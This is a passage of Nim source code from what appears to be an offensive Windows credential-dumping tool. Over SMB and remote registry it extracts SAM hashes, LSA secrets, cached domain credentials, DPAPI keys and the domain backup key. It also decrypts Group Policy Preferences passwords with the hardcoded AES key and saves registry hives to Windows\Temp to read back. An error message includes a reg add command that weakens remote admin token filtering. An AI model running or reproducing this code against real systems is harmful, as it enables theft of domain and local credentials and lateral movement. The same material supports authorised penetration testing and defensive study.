      let aes128 = kerbStringToKeyAes(passwordUtf8, salt, 16)
      let des    = kerbStringToKeyDes(passwordUtf8, salt)
      result.accountName = domainUp & "\\" & shortHost.toUpperAscii() & "$"
      result.kerbKeys.add MachineKerbKey(keyType: "aes256-cts-hmac-sha1-96", keyHex: toHexStr(aes256))
      result.kerbKeys.add MachineKerbKey(keyType: "aes128-cts-hmac-sha1-96", keyHex: toHexStr(aes128))
      result.kerbKeys.add MachineKerbKey(keyType: "des-cbc-md5",             keyHex: toHexStr(des))
  elif upper.startsWith("DEFAULTPASSWORD"):
    result.secretType = "default_password"
    result.plainText = fromUtf16Le(plainText)
  elif upper.startsWith("G$BCKUPKEY"):
    result.secretType = "backup_key"
  else:
    result.secretType = "raw"

proc dumpLsaSecrets(s: rrp.RrpSession; lsaKey, host, domain: string): Future[seq[LsaSecret]] {.async.} =
  let hSecrets = await s.openKey("SECURITY\\Policy\\Secrets")
  if hSecrets.len == 0: return
  let secretNames = await s.enumKeys(hSecrets)
  await s.closeKey(hSecrets)

  for name in secretNames:
    let upper = name.toUpperAscii()
    if upper == "NL$CONTROL": continue
    let currPath = "SECURITY\\Policy\\Secrets\\" & name & "\\CurrVal"
    let hCurr = await s.openKey(currPath)
    if hCurr.len == 0: continue
    let encData = await s.queryValueData(hCurr, "default")
    await s.closeKey(hCurr)
    if encData.len == 0: continue
    let plain = decryptLsaSecret(lsaKey, encData)
    if plain.len == 0: continue
    var secret = classifyLsaSecret(name, plain, host, domain)
    result.add secret

proc dumpLsaSecretsHive(securityHive, lsaKey, host, domain: string): seq[LsaSecret] =
  let h = RegHive(data: securityHive)
  for name in hiveEnumSubKeys(h, "Policy\\Secrets"):
    let upper = name.toUpperAscii()
    if upper == "NL$CONTROL": continue
    let encData = hiveReadValue(h, "Policy\\Secrets\\" & name & "\\CurrVal", "default")
    if encData.len == 0: continue
    let plain = decryptLsaSecret(lsaKey, encData)
    if plain.len == 0: continue
    result.add classifyLsaSecret(name, plain, host, domain)

proc readDpapiSystemOldKeyHive(securityHive, lsaKey: string): tuple[machineKey, userKey: string] =
  let h = RegHive(data: securityHive)
  let encData = hiveReadValue(h, "Policy\\Secrets\\DPAPI_SYSTEM\\OldVal", "default")
  if encData.len == 0: return ("", "")
  let plain = decryptLsaSecret(lsaKey, encData)
  if plain.len < 44: return ("", "")
  (toHexStr(plain[4..23]), toHexStr(plain[24..43]))

proc dumpCachedCreds(s: rrp.RrpSession; lsaKey: string): Future[seq[CachedEntry]] {.async.} =
  let nlkmData = await s.readKeyData("SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal", "default")
  if nlkmData.len == 0: return
  let nlkm = decryptLsaSecret(lsaKey, nlkmData)
  if nlkm.len < 32: return
  let decKey = nlkm[16..31]

  let hCache = await s.openKey("SECURITY\\Cache")
  if hCache.len == 0: return
  let valueNames = await s.enumValues(hCache)
  await s.closeKey(hCache)

  var iterCount = 10240
  for vn in valueNames:
    if vn.toUpperAscii() == "NL$ITERATIONCOUNT":
      let hc2 = await s.openKey("SECURITY\\Cache")
      let r = await s.queryValue(hc2, vn)
      await s.closeKey(hc2)
      if r.ok and r.data.len >= 4:
        let ic = int(rrp.readU32Le(r.data, 0))
        iterCount = if ic > 10240: ic and int(0xfffffc00'u32) else: ic * 1024

  for vn in valueNames:
    let upper = vn.toUpperAscii()
    if upper == "NL$CONTROL" or upper == "NL$ITERATIONCOUNT": continue
    if not upper.startsWith("NL$"): continue

    let recData = await s.readKeyData("SECURITY\\Cache", vn)
    if recData.len < 96: continue

    let flags = int(rrp.readU32Le(recData, 48))
    let iv16  = recData[64..79]
    let encData = recData[96 ..< recData.len]

    if iv16 == repeat('\x00', 16): continue
    if (flags and 1) == 0: continue

    let userLen   = int(uint16(ord(recData[0])) or (uint16(ord(recData[1])) shl 8))
    let domainLen = int(uint16(ord(recData[2])) or (uint16(ord(recData[3])) shl 8))
    let dnsDomLen = int(uint16(ord(recData[60])) or (uint16(ord(recData[61])) shl 8))

    let plain = aesCbcDecrypt(decKey, encData, iv16)
    if plain.len < 0x10 + 0x48: continue

    let encHash = plain[0 ..< 0x10]
    let rest = plain[0x48 ..< plain.len]

    let pad4 = proc(n: int): int = (n + 3) and not(3)

    var off = 0
    if off + userLen > rest.len: continue
    let userName = fromUtf16Le(rest[off ..< off + userLen])
    off += pad4(userLen) + pad4(domainLen)
    if off + dnsDomLen > rest.len: continue
    let domainLong = fromUtf16Le(rest[off ..< off + dnsDomLen])

    proc isAsciiStr(s: string): bool =
      if s.len == 0: return false
      for c in s:
        if ord(c) < 0x20 or ord(c) > 0x7e: return false
      true
    if not isAsciiStr(userName): continue
    let safeDomain = if isAsciiStr(domainLong): domainLong else: ""
    result.add CachedEntry(
      domain: safeDomain,
      username: userName,
      dcc2: "$DCC2$" & $iterCount & "#" & userName & "#" & toHex(encHash),
      iterations: iterCount
    )

proc dumpCachedCredsHive(securityHive: string; lsaKey: string): seq[CachedEntry] =
  let h = RegHive(data: securityHive)
  let nlkmData = hiveReadValue(h, "Policy\\Secrets\\NL$KM\\CurrVal", "default")
  if nlkmData.len == 0: return
  let nlkm = decryptLsaSecret(lsaKey, nlkmData)
  if nlkm.len < 32: return
  let decKey = nlkm[16..31]

  let valueNames = hiveEnumValues(h, "Cache")
  var iterCount = 10240
  for vn in valueNames:
    if vn.toUpperAscii() == "NL$ITERATIONCOUNT":
      let data = hiveReadValue(h, "Cache", vn)
      if data.len >= 4:
        let ic = int(rrp.readU32Le(data, 0))
        iterCount = if ic > 10240: ic and int(0xfffffc00'u32) else: ic * 1024

  for vn in valueNames:
    let upper = vn.toUpperAscii()
    if upper == "NL$CONTROL" or upper == "NL$ITERATIONCOUNT": continue
    if not upper.startsWith("NL$"): continue
    let recData = hiveReadValue(h, "Cache", vn)
    if recData.len < 96: continue

    let flags = int(rrp.readU32Le(recData, 48))
    let iv16  = recData[64..79]
    let encData = recData[96 ..< recData.len]
    if iv16 == repeat('\x00', 16): continue
    if (flags and 1) == 0: continue

    let userLen   = int(uint16(ord(recData[0])) or (uint16(ord(recData[1])) shl 8))
    let domainLen = int(uint16(ord(recData[2])) or (uint16(ord(recData[3])) shl 8))
    let dnsDomLen = int(uint16(ord(recData[60])) or (uint16(ord(recData[61])) shl 8))

    let plain = aesCbcDecrypt(decKey, encData, iv16)
    if plain.len < 0x10 + 0x48: continue

    let encHash = plain[0 ..< 0x10]
    let rest = plain[0x48 ..< plain.len]
    let pad4 = proc(n: int): int = (n + 3) and not(3)

    var off = 0
    if off + userLen > rest.len: continue
    let userName = fromUtf16Le(rest[off ..< off + userLen])
    off += pad4(userLen) + pad4(domainLen)
    if off + dnsDomLen > rest.len: continue
    let domainLong = fromUtf16Le(rest[off ..< off + dnsDomLen])

    proc isAsciiStr(s: string): bool =
      if s.len == 0: return false
      for c in s:
        if ord(c) < 0x20 or ord(c) > 0x7e: return false
      true
    if not isAsciiStr(userName): continue
    let safeDomain = if isAsciiStr(domainLong): domainLong else: ""
    result.add CachedEntry(
      domain: safeDomain,
      username: userName,
      dcc2: "$DCC2$" & $iterCount & "#" & userName & "#" & toHex(encHash),
      iterations: iterCount
    )

proc nativeHiveFallback(session: smb.SmbSession; sess: rrp.RrpSession;
                        host: string; port: int; bootKey, domain: string): Future[SecretsResult] {.async.} =
  result.host = host
  result.port = port
  result.authenticated = true
  let treeId =
    if session.adminTreeId != 0: session.adminTreeId
    else: await smb.connectShareTree(session, "ADMIN$")
  if treeId == 0:
    result.error = "native hive fallback failed: ADMIN$ tree connect failed"
    return

  let freshSess = rrp.newRrpSession(session.ctx)
  let freshOk = await freshSess.connect()
  if not freshOk:
    result.error = "native hive fallback failed: fresh RRP session failed: " & freshSess.error
    return

  randomize()
  let prefix = "nimux-" & $int(epochTime()) & "-" & $rand(999999)
  var samHive = ""
  var securityHive = ""

  let savePaths = [
    ("C:\\Windows\\Temp\\", "Temp\\"),
    ("..\\Temp\\", "Temp\\"),
    ("Temp\\", "Temp\\"),
    ("\\Windows\\Temp\\", "Temp\\"),
  ]

  for hiveName in ["SAM", "SECURITY"]:
    let fileName = prefix & "-" & hiveName.toLowerAscii() & ".tmp"
    var saved = false
    var savedRemotePath = ""
    var lastStatus: uint32 = 0
    for (savePath, readPath) in savePaths:
      let saveStatus = await freshSess.saveKey(hiveName, savePath & fileName)
      lastStatus = saveStatus
      if saveStatus == 0:
        let remotePath = readPath & fileName
        var r: tuple[exists: bool; data: string]
        for attempt in 0 ..< 20:
          r = await smbfiles.readSmbFile(session.ctx, treeId, remotePath, false)
          if r.exists and r.data.len > 0:
            break
          await sleepAsync(250 + attempt * 100)
        if r.exists and r.data.len > 0:
          discard await smbfiles.readSmbFile(session.ctx, treeId, remotePath, true)
          case hiveName
          of "SAM": samHive = r.data
          of "SECURITY": securityHive = r.data
          else: discard
          saved = true
          break
        discard await smbfiles.readSmbFile(session.ctx, treeId, remotePath, true)
    if not saved:
      let hint =
        if lastStatus == 0xC0000022'u32 or lastStatus == 0x00000005'u32:
          " (access denied — local admin accounts are token-filtered over RPC;" &
          " use built-in Administrator or enable: reg add HKLM\\SOFTWARE\\Microsoft\\Windows" &
          "\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f)"
        else: ""
      result.error = "native hive fallback failed: " & hiveName &
        " status 0x" & lastStatus.toHex(8) & hint
      return

  result.bootKey = toHexStr(bootKey)
  result.samAccounts = dumpSamHive(samHive, bootKey)
  let lsaKey = getLsaKeyHive(securityHive, bootKey)
  result.hiveLsaKey = lsaKey
  if lsaKey.len >= 16:
    proc decodeRegSzHive(raw: string): string =
      if raw.len >= 2 and ord(raw[1]) == 0: return fromUtf16Le(raw)
      result = raw
      while result.len > 0 and ord(result[^1]) == 0: result.setLen(result.len - 1)
    var defUser = ""
    var defDomain = ""
    let winlogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    let wSess2 = rrp.newRrpSession(session.ctx)
    if await wSess2.connect():
      defUser   = decodeRegSzHive(await wSess2.readKeyData(winlogonPath, "DefaultUserName"))
      defDomain = decodeRegSzHive(await wSess2.readKeyData(winlogonPath, "DefaultDomainName"))
    for s2 in dumpLsaSecretsHive(securityHive, lsaKey, host, domain):
      if s2.secretType == "dpapi_system" and s2.plainText.len >= 44:
        result.dpapiMachineKey = toHexStr(s2.plainText[4..23])
        result.dpapiUserKey    = toHexStr(s2.plainText[24..43])
      elif s2.secretType == "default_password":
        var s3 = s2
        let effDomain = if defDomain.len > 0: defDomain elif domain.len > 0: domain else: host
        s3.accountName = if defUser.len > 0: effDomain & "\\" & defUser else: ""
        result.lsaSecrets.add s3
      elif s2.secretType == "backup_key":
        if result.domainBackupKey.len == 0 and s2.plainText.len >= 12:
          let bkVer = readU32Le(s2.plainText, 0)
          if bkVer == 2:
            let bkLen = int(readU32Le(s2.plainText, 4))
            if 12 + bkLen <= s2.plainText.len:
              result.domainBackupKey = s2.plainText[12 ..< 12 + bkLen]
          elif bkVer == 1 and s2.plainText.len > 4:
            result.domainBackupKey = s2.plainText[4 ..< s2.plainText.len]
        result.lsaSecrets.add s2
      else:
        result.lsaSecrets.add s2
    let (oldMK, oldUK) = readDpapiSystemOldKeyHive(securityHive, lsaKey)
    result.dpapiMachineKeyOld = oldMK
    result.dpapiUserKeyOld    = oldUK
    result.cachedCreds = dumpCachedCredsHive(securityHive, lsaKey)

  result.success = result.samAccounts.len > 0 or result.lsaSecrets.len > 0 or
    result.cachedCreds.len > 0 or result.dpapiMachineKey.len > 0
  if result.success:
    result.message = "dumped via native RRP hive save/readback"
  else:
    result.error = "native hive fallback completed but parsed no secrets"

proc extractBackupKeyPrivBlob(plainText: string): string =
  if plainText.len < 12: return ""
  let version = readU32Le(plainText, 0)
  if version == 2:
    let keyLen  = int(readU32Le(plainText, 4))
    if 12 + keyLen > plainText.len: return ""
    return plainText[12 ..< 12 + keyLen]
  elif version == 1:
    if plainText.len > 4:
      return plainText[4 ..< plainText.len]
  ""

const LsaUuidBytes = [byte 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab]

proc addU32LeLsa(r: var string; v: uint32) =
  r.add char(v and 0xff)
  r.add char((v shr 8) and 0xff)
  r.add char((v shr 16) and 0xff)
  r.add char((v shr 24) and 0xff)

proc ndrUnicodeStrLsa(s: string): string =
  let utf = smb.toUtf16Le(s)
  let byteLen = utf.len
  let maxByteLen = byteLen + 2
  result.add char(byteLen and 0xff)
  result.add char((byteLen shr 8) and 0xff)
  result.add char(maxByteLen and 0xff)
  result.add char((maxByteLen shr 8) and 0xff)
  result.addU32LeLsa 0x00020000'u32
  result.addU32LeLsa uint32(maxByteLen div 2)
  result.addU32LeLsa 0'u32
  result.addU32LeLsa uint32(byteLen div 2)
  result.add utf
  let rem = utf.len mod 4
  if rem != 0:
    for _ in 0 ..< (4 - rem): result.add char(0)

proc buildLsarOpenPolicy2(): string =
  result.addU32LeLsa 0'u32
  for _ in 0 ..< 6: result.addU32LeLsa 0'u32
  result.addU32LeLsa 0x02000000'u32

proc buildLsarRetrievePrivateData(policyHandle, keyName: string): string =
  result.add policyHandle[0 ..< 20]
  result.add ndrUnicodeStrLsa(keyName)
  result.addU32LeLsa 0'u32

proc buildLsarClose(handle: string): string =
  result.add handle[0 ..< 20]

proc desTransformKey(s: string): string =
  result = newString(8)
  result[0] = chr(((ord(s[0]) shr 1) shl 1) and 0xfe)
  result[1] = chr(((((ord(s[0]) and 0x01) shl 6) or (ord(s[1]) shr 2)) shl 1) and 0xfe)
  result[2] = chr(((((ord(s[1]) and 0x03) shl 5) or (ord(s[2]) shr 3)) shl 1) and 0xfe)
  result[3] = chr(((((ord(s[2]) and 0x07) shl 4) or (ord(s[3]) shr 4)) shl 1) and 0xfe)
  result[4] = chr(((((ord(s[3]) and 0x0f) shl 3) or (ord(s[4]) shr 5)) shl 1) and 0xfe)
  result[5] = chr(((((ord(s[4]) and 0x1f) shl 2) or (ord(s[5]) shr 6)) shl 1) and 0xfe)
  result[6] = chr(((((ord(s[5]) and 0x3f) shl 1) or (ord(s[6]) shr 7)) shl 1) and 0xfe)
  result[7] = chr(((ord(s[6]) and 0x7f) shl 1) and 0xfe)

proc lsaDecryptSecretRaw(sessionKey, value: string): string =
  if sessionKey.len < 7: return ""
  var key0 = sessionKey
  var val  = value
  while val.len >= 8:
    let cipher8 = val[0 ..< 8]
    let tmpKey  = desTransformKey(key0[0 ..< 7])
    result.add desEcbDecrypt(tmpKey, cipher8)
    key0 = key0[7 ..< key0.len]
    val  = val[8 ..< val.len]
    if key0.len < 7: key0 = sessionKey[key0.len ..< sessionKey.len]

proc lsaStripSecretHeader(plain: string): string =
  result = plain
  if result.len >= 16:
    let secretLen = int(readU32Le(result, 0))
    if 8 + secretLen <= result.len:
      result = result[8 ..< 8 + secretLen]
    else:
      result = result[8 ..< result.len]

proc lsaDecryptSecret(sessionKey, value: string): string =
  result = lsaStripSecretHeader(lsaDecryptSecretRaw(sessionKey, value))

proc fetchDomainBackupKey*(session: smb.SmbSession; lsaKey = ""): Future[string] {.async.} =
  let lsaDebug = getEnv("NIMUX_DEBUG").len > 0
  proc debugBk(msg: string) =
    if lsaDebug:
      stderr.writeLine("[secrets-debug] " & msg)

  if lsaKey.len < 16:
    debugBk("domain backup key skipped: lsaKey.len=" & $lsaKey.len)
    return ""

  let pipe = await smb.openSmbPipe(session.ctx, "lsarpc")
  if not pipe.attempted or pipe.status != 0: return ""
  let bindBytes = smb.buildDceRpcBind(LsaUuidBytes, 0'u16, 0'u16, 1'u32)
  let bindAck = await smb.rpcBindPipe(session.ctx, pipe, bindBytes)
  if not bindAck.attempted: return ""
  let openStub = await smb.rpcCall(session.ctx, pipe, 44'u16, buildLsarOpenPolicy2(), 1)
  if openStub.len < 24: return ""
  if readU32Le(openStub, openStub.len - 4) != 0: return ""
  let policyHandle = openStub[0 ..< 20]

  proc parsePrivData(stub: string): tuple[data: string; status: uint32] =
    result.status = 0xffffffff'u32
    if stub.len < 8: return
    result.status = readU32Le(stub, stub.len - 4)
    if result.status != 0: return
    var off = 0
    let outerRef = readU32Le(stub, off); off += 4
    if outerRef == 0: return
    if off + 4 > stub.len: return
    let dataLen = int(readU32Le(stub, off)); off += 4
    if off + 4 > stub.len: return
    off += 4
    if off + 4 > stub.len: return
    off += 4
    if off + 4 > stub.len: return
    off += 4
    if off + 4 > stub.len: return
    off += 4
    if off + 4 > stub.len: return
    off += 4
    if off + dataLen > stub.len: return
    result.data = stub[off ..< off + dataLen]

  proc lsaGuidToKeyName(data: string): string =
    if data.len < 16: return ""
    const h = "0123456789ABCDEF"
    proc hx(c: char): string =
      result = newString(2)
      result[0] = h[(ord(c) shr 4) and 0xf]
      result[1] = h[ord(c) and 0xf]
    let g = data
    "G$BCKUPKEY_" &
      hx(g[3]) & hx(g[2]) & hx(g[1]) & hx(g[0]) & "-" &
      hx(g[5]) & hx(g[4]) & "-" &
      hx(g[7]) & hx(g[6]) & "-" &
      hx(g[8]) & hx(g[9]) & "-" &
      hx(g[10]) & hx(g[11]) & hx(g[12]) & hx(g[13]) & hx(g[14]) & hx(g[15])

  proc extractPreferredGuid(plain: string): string =
    let stripped = lsaStripSecretHeader(plain)
    if stripped.len == 16: return stripped
    if plain.len == 16: return plain
    ""

  proc extractBackupKeyFromRpcPlain(plain: string): string =
    result = extractBackupKeyPrivBlob(plain)
    if result.len == 0:
      result = extractBackupKeyPrivBlob(lsaStripSecretHeader(plain))

  let appKey =
    case session.ctx.negotiate.dialect
    of "SMB 3.0", "SMB 3.0.2":
      smb.smb3KdfCounter(session.sessionBaseKey, "SMB2APP\x00", "SmbRpc\x00", 128'u32)
    of "SMB 3.1.1":
      smb.smb3KdfCounter(session.sessionBaseKey, "SMBAppKey\x00", session.ctx.preauthHash, 128'u32)
    else:
      session.ctx.sessionKey
  let decryptKey = appKey
  proc lsaRpcDecryptRaw(data: string): string = lsaDecryptSecretRaw(decryptKey, data)

  var backupKey = ""
  var callId: uint32 = 2

  let prefResp = parsePrivData(await smb.rpcCall(session.ctx, pipe, 43'u16,
    buildLsarRetrievePrivateData(policyHandle, "G$BCKUPKEY_PREFERRED"), callId))
  inc callId
  debugBk("G$BCKUPKEY_PREFERRED status=0x" & prefResp.status.toHex(8) &
    " enc.len=" & $prefResp.data.len & " lsaKey.len=" & $lsaKey.len)
  let prefPlain = lsaRpcDecryptRaw(prefResp.data)
  let guidBytes = extractPreferredGuid(prefPlain)
  if guidBytes.len == 16:
    let keyName = lsaGuidToKeyName(guidBytes)
    if keyName.len > 0:
      debugBk("domain backup key lookup lsaKey.len=" & $lsaKey.len & " keyName=" & keyName)
      let keyResp = parsePrivData(await smb.rpcCall(session.ctx, pipe, 43'u16,
        buildLsarRetrievePrivateData(policyHandle, keyName), callId))
      inc callId
      debugBk(keyName & " status=0x" & keyResp.status.toHex(8) & " enc.len=" & $keyResp.data.len)
      let keyData = lsaRpcDecryptRaw(keyResp.data)
      if keyData.len > 12:
        backupKey = extractBackupKeyFromRpcPlain(keyData)
  else:
    debugBk("preferred backup key GUID parse failed: plain.len=" & $prefPlain.len &
      " plain.hex=" & toHexStr(prefPlain))

  if backupKey.len == 0:
    let pResp = parsePrivData(await smb.rpcCall(session.ctx, pipe, 43'u16,
      buildLsarRetrievePrivateData(policyHandle, "G$BCKUPKEY_P"), callId))
    inc callId
    debugBk("G$BCKUPKEY_P status=0x" & pResp.status.toHex(8) &
      " enc.len=" & $pResp.data.len)
    let pData = lsaRpcDecryptRaw(pResp.data)
    if pData.len > 12:
      backupKey = extractBackupKeyFromRpcPlain(pData)

  discard await smb.rpcCall(session.ctx, pipe, 0'u16, buildLsarClose(policyHandle), callId)
  return backupKey


const GppAesKey = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8" &
                  "\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

const GppXmlFiles = ["Groups.xml", "Services.xml", "ScheduledTasks.xml",
                     "DataSources.xml", "Printers.xml", "Drives.xml"]

proc gppDecrypt(cpassword: string): string =
  if cpassword.len == 0: return ""
  var padded = cpassword
  while padded.len mod 4 != 0: padded.add '='
  let decoded = try: base64.decode(padded) except: return ""
  if decoded.len == 0: return ""
  result = aesCbcDecrypt(GppAesKey, decoded, repeat('\x00', 16))
  if result.len == 0: return ""
  result = fromUtf16Le(result)

proc extractGppAttr(xml, attr: string): string =
  let pat = attr & "=\""
  let i = xml.find(pat)
  if i < 0: return ""
  let start = i + pat.len
  let e = xml.find('"', start)
  if e < 0: return ""
  xml[start ..< e]

proc parseGppXml(data, filename: string): seq[GppPassword] =
  var pos = 0
  while pos < data.len:
    let cp = data.find("cpassword=\"", pos)
    if cp < 0: break
    let lineStart = max(0, data.rfind('<', cp))
    let lineEnd = data.find('>', cp)
    if lineEnd < 0: break
    let chunk = data[lineStart .. lineEnd]
    let cpval = extractGppAttr(chunk, "cpassword")
    if cpval.len > 0:
      let pwd = gppDecrypt(cpval)
      if pwd.len > 0:
        result.add GppPassword(
          file:     filename,
          username: if extractGppAttr(chunk, "userName").len > 0: extractGppAttr(chunk, "userName")
                    else: extractGppAttr(chunk, "name"),
          newName:  extractGppAttr(chunk, "newName"),
          password: pwd,
          changed:  extractGppAttr(chunk, "changed"),
          disabled: extractGppAttr(chunk, "acctDisabled"))
    pos = lineEnd + 1

proc searchGppDir(session: smb.SmbSession; treeId: uint32; dirPath: string): Future[seq[GppPassword]] {.async.} =
  let listing = await smb.listShareDirectory(session, "SYSVOL", dirPath)
  for entry in listing.entries:
    let entryPath = dirPath & "\\" & entry.name
    if entry.isDirectory:
      let sub = await searchGppDir(session, treeId, entryPath)
      result.add sub
    else:
      for f in GppXmlFiles:
        if entry.name.toLowerAscii() == f.toLowerAscii():
          let data = await smbtransfer.readFileIntoMemory(session, treeId, entryPath)
          if data.len > 0:
            result.add parseGppXml(data, entryPath)

proc dumpGppPasswords*(session: smb.SmbSession): Future[seq[GppPassword]] {.async.} =
  let treeId = await smb.connectShareTree(session, "SYSVOL")
  if treeId == 0: return
  result = await searchGppDir(session, treeId, "")

proc dumpSecrets*(host: string; port, timeoutMs: int;
                  username, password, ntlmHash, domain: string;
                  fullFallback = false; kerberos = false;
                  ccache = ""; krb5Config = ""): Future[SecretsResult] {.async.} =
  result = SecretsResult(host: host, port: port)

  let cred = smb.SmbCredential(
    username: username, password: password,
    ntlmHash: ntlmHash, domain: domain,
    ccache: ccache, krb5Config: krb5Config
  )
  let authMethod = if kerberos: smb.samKerberos else: smb.samNtlm

  var session: smb.SmbSession
  try:
    session = await smb.establishSmbSession(host, port, timeoutMs, cred, authMethod)
  except:
    result.error = "SMB connection failed: " & getCurrentExceptionMsg()
    return
  if not session.authenticated:
    result.error = "SMB authentication failed" &
      (if session.message.len > 0: ": " & session.message else: "")
    return

  result.authenticated = true

  let sess = rrp.newRrpSession(session.ctx)
  let connected = await sess.connect()
  if not connected:
    result.authenticated = true
    result.message = "no Windows registry (Linux/Samba DC — use dcsync for hashes)"
    return

  let bootKey = await getBootKey(sess)
  if bootKey.len == 0:
    result.error = "failed to read boot key from SYSTEM hive"
    return
  result.bootKey = toHexStr(bootKey)

  let samAccts = await dumpSam(sess, bootKey)
  result.samAccounts = samAccts
  let samAccessDenied = result.samAccounts.len == 0 and sess.lastStatus == 5'u32

  let secCtx = rrp.newRrpSession(session.ctx)
  let secConnected = await secCtx.connect()
  var lsaKey = ""
  if secConnected:
    lsaKey = await getLsaKey(secCtx, bootKey)

  try:
    result.domainBackupKey = await fetchDomainBackupKey(session, lsaKey)
  except CatchableError:
    discard

  if lsaKey.len >= 16:
    let secrets = await dumpLsaSecrets(secCtx, lsaKey, host, domain)
    proc decodeRegSz(raw: string): string =
      if raw.len >= 2 and ord(raw[1]) == 0: return fromUtf16Le(raw)
      result = raw
      while result.len > 0 and ord(result[^1]) == 0: result.setLen(result.len - 1)
    var defUser = ""
    var defDomain = ""
    let winlogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
    block readWinlogon:
      let wSess = rrp.newRrpSession(session.ctx)
      if await wSess.connect():
        let hWin = await wSess.openKey(winlogonPath)
        if hWin.len > 0:
          defUser   = decodeRegSz(await wSess.queryValueData(hWin, "DefaultUserName"))
          defDomain = decodeRegSz(await wSess.queryValueData(hWin, "DefaultDomainName"))
          await wSess.closeKey(hWin)
    for s2 in secrets:
      if s2.secretType == "dpapi_system" and s2.plainText.len >= 44:
        result.dpapiMachineKey = toHexStr(s2.plainText[4..23])
        result.dpapiUserKey    = toHexStr(s2.plainText[24..43])
      elif s2.secretType == "default_password":
        var s3 = s2
        let effDomain = if defDomain.len > 0: defDomain
                        elif domain.len > 0: domain else: host
        s3.accountName = if defUser.len > 0: effDomain & "\\" & defUser else: ""
        result.lsaSecrets.add s3
      elif s2.secretType == "backup_key":
        let privBlob = extractBackupKeyPrivBlob(s2.plainText)
        if privBlob.len > 0 and result.domainBackupKey.len == 0:
          result.domainBackupKey = privBlob
        result.lsaSecrets.add s2
      else:
        result.lsaSecrets.add s2

    if result.domainBackupKey.len == 0:
      try:
        let hPref = await secCtx.openKey("SECURITY\\Policy\\Secrets\\G$BCKUPKEY_PREFERRED\\CurrVal")
        if hPref.len > 0:
          let prefEncData = await secCtx.queryValueData(hPref, "default")
          await secCtx.closeKey(hPref)
          if prefEncData.len > 0:
            let prefPlain = decryptLsaSecret(lsaKey, prefEncData)
            if prefPlain.len == 16:
              proc guidUpperStr(g: string): string =
                const hd = "0123456789ABCDEF"
                proc hx(c: char): string =
                  result = newString(2)
                  result[0] = hd[(ord(c) shr 4) and 0xf]
                  result[1] = hd[ord(c) and 0xf]
                hx(g[3]) & hx(g[2]) & hx(g[1]) & hx(g[0]) & "-" &
                hx(g[5]) & hx(g[4]) & "-" &
                hx(g[7]) & hx(g[6]) & "-" &
                hx(g[8]) & hx(g[9]) & "-" &
                hx(g[10]) & hx(g[11]) & hx(g[12]) & hx(g[13]) & hx(g[14]) & hx(g[15])
              let bkKeyName = "SECURITY\\Policy\\Secrets\\G$BCKUPKEY_{" & guidUpperStr(prefPlain) & "}\\CurrVal"
              let hBackup = await secCtx.openKey(bkKeyName)
              if hBackup.len > 0:
                let backupEncData = await secCtx.queryValueData(hBackup, "default")
                await secCtx.closeKey(hBackup)
                if backupEncData.len > 0:
                  let backupPlain = decryptLsaSecret(lsaKey, backupEncData)
                  let privBlob = extractBackupKeyPrivBlob(backupPlain)
                  if privBlob.len > 0:
                    result.domainBackupKey = privBlob
      except CatchableError:
        discard

    let hOldDpapi = await secCtx.openKey("SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\OldVal")
    if hOldDpapi.len > 0:
      let oldEncData = await secCtx.queryValueData(hOldDpapi, "default")
      await secCtx.closeKey(hOldDpapi)
      if oldEncData.len > 0:
        let oldPlain = decryptLsaSecret(lsaKey, oldEncData)
        if oldPlain.len >= 44:
          result.dpapiMachineKeyOld = toHexStr(oldPlain[4..23])
          result.dpapiUserKeyOld    = toHexStr(oldPlain[24..43])

    let cached = await dumpCachedCreds(secCtx, lsaKey)
    result.cachedCreds = cached

  if result.dpapiMachineKey.len > 0 or result.dpapiUserKey.len > 0:
    try:
      result.dpapiMasterKeys = await dpapimod.fetchAndDecryptMasterKeys(
        session, result.dpapiMachineKey, result.dpapiUserKey,
        result.dpapiMachineKeyOld, result.dpapiUserKeyOld,
        result.domainBackupKey)
    except CatchableError as e:
      result.message = "dpapi master key fetch: " & e.msg

  result.success = result.samAccounts.len > 0 or result.lsaSecrets.len > 0 or
    result.cachedCreds.len > 0 or result.dpapiMachineKey.len > 0
  if not result.success and result.error.len == 0:
    if samAccessDenied or secCtx.lastStatus == 5'u32:
      let savedBackupKey = result.domainBackupKey
      result = await nativeHiveFallback(session, sess, host, port, bootKey, domain)
      result.port = port
      if result.domainBackupKey.len == 0:
        result.domainBackupKey = savedBackupKey
      if result.domainBackupKey.len == 0 and result.hiveLsaKey.len >= 16:
        try:
          result.domainBackupKey = await fetchDomainBackupKey(session, result.hiveLsaKey)
        except CatchableError:
          discard
      if result.dpapiMachineKey.len > 0 or result.dpapiUserKey.len > 0:
        try:
          result.dpapiMasterKeys = await dpapimod.fetchAndDecryptMasterKeys(
            session, result.dpapiMachineKey, result.dpapiUserKey,
            result.dpapiMachineKeyOld, result.dpapiUserKeyOld,
            result.domainBackupKey)
        except CatchableError as e:
          result.message.add " | dpapi: " & e.msg
    else:
      result.message = "no secrets found (admin required)"

  if result.dpapiMasterKeys.len > 0:
    try:
      let allMasterKeys = result.dpapiMasterKeys
      result.dpapiCredentials = await dpapimod.fetchAndDecryptCredentials(session, allMasterKeys)
      var userAccts: seq[tuple[username, ntHashHex: string]]
      for a in result.samAccounts:
        if a.ntHash.len > 0:
          userAccts.add((a.username, toHexStr(a.ntHash)))
      let userCreds = await dpapimod.fetchUserCredentials(session, userAccts, domain, allMasterKeys, result.domainBackupKey)
      for uc in userCreds:
        if uc.error.len == 0:
          var replaced = false
          for i in 0 ..< result.dpapiCredentials.len:
            if result.dpapiCredentials[i].file == uc.file and result.dpapiCredentials[i].error.len > 0:
              result.dpapiCredentials[i] = uc
              replaced = true
              break
          if not replaced:
            result.dpapiCredentials.add uc
        else:
          result.dpapiCredentials.add uc
    except CatchableError:
      discard

  try:
    result.gppPasswords = await dumpGppPasswords(session)
  except CatchableError:
    discard
